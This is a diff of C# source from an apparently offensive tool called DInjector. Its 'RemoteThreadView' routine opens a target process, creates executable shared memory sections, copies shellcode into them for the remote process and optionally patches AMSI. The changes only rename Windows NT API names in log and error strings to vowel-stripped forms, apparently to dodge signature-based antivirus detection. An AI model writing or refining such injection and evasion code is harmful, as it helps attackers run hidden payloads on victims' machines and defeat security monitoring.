@@ -23,9 +23,9 @@ namespace DInjector
                 ref ci);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThreadView) [+] NtOpenProcess");
+                Console.WriteLine("(RemoteThreadView) [+] NtOpnPrcss");
             else
-                throw new Exception($"(RemoteThreadView) [-] NtOpenProcess: {ntstatus}");
+                throw new Exception($"(RemoteThreadView) [-] NtOpnPrcss: {ntstatus}");
 
             if (remoteAm51)
                 AM51.Patch(
@@ -52,9 +52,9 @@ namespace DInjector
                 IntPtr.Zero);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThreadView) [+] NtCreateSection, PAGE_EXECUTE_READWRITE");
+                Console.WriteLine("(RemoteThreadView) [+] NtCrtSctn, PAGE_EXECUTE_READWRITE");
             else
-                throw new Exception($"(RemoteThreadView) [-] NtCreateSection, PAGE_EXECUTE_READWRITE: {ntstatus}");
+                throw new Exception($"(RemoteThreadView) [-] NtCrtSctn, PAGE_EXECUTE_READWRITE: {ntstatus}");
 
             #endregion
 
@@ -80,9 +80,9 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThreadView) [+] NtMapViewOfSection, PAGE_READWRITE");
+                Console.WriteLine("(RemoteThreadView) [+] NtMpVwOfSctn, PAGE_READWRITE");
             else
-                throw new Exception($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_READWRITE: {ntstatus}");
+                throw new Exception($"(RemoteThreadView) [-] NtMpVwOfSctn, PAGE_READWRITE: {ntstatus}");
 
             #endregion
 
@@ -107,9 +107,9 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READ);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThreadView) [+] NtMapViewOfSection, PAGE_EXECUTE_READ");
+                Console.WriteLine("(RemoteThreadView) [+] NtMpVwOfSctn, PAGE_EXECUTE_READ");
             else
-                throw new Exception($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_EXECUTE_READ: {ntstatus}");
+                throw new Exception($"(RemoteThreadView) [-] NtMpVwOfSctn, PAGE_EXECUTE_READ: {ntstatus}");
 
             // Copy the shellcode into the locally mapped view which will be reflected on the remotely mapped view
             Marshal.Copy(shellcode, 0, lbaseAddress, shellcode.Length);
@@ -148,9 +148,9 @@ namespace DInjector
                 lbaseAddress);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThreadView) [+] NtUnmapViewOfSection");
+                Console.WriteLine("(RemoteThreadView) [+] NtUnmpVwOfSctn");
             else
-                throw new Exception($"(RemoteThreadView) [-] NtUnmapViewOfSection: {ntstatus}");
+                throw new Exception($"(RemoteThreadView) [-] NtUnmpVwOfSctn: {ntstatus}");
 
             #endregion
 
